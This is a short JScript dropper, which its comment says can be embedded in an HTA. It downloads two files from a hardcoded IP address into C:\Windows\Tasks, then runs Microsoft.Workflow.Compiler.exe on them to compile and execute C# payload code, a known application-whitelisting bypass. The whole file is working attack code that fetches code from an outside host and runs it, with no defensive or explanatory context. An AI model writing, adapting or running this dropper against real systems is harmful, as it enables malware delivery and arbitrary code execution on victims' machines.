// Simple JScript dropper that can also be embedded in HTA, its making use of Windows workflow compiler to compile and run a cshart based dropper

var url = "http://192.168.49.70";
var files = ["out.xml","source.txt"];
var client = WScript.CreateObject('MSXML2.XMLHTTP');

for (var i in files) {
        var to_download = url + "/" + files[i];
        client.Open('GET', to_download, false);
        client.Send();

        if (client.status == 200) {
                var Stream = WScript.CreateObject('ADODB.Stream');
                Stream.Open();
                Stream.Type = 1;
                Stream.Write(client.ResponseBody);
                Stream.Position = 0;
                Stream.SaveToFile("C:\\Windows\\Tasks\\" + files[i], 2);
                Stream.Close();
        }
}

var cmd = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe C:\\Windows\\Tasks\\out.xml C:\\Windows\\Tasks\\result.xml";
var r = new ActiveXObject("WScript.Shell").Run(cmd);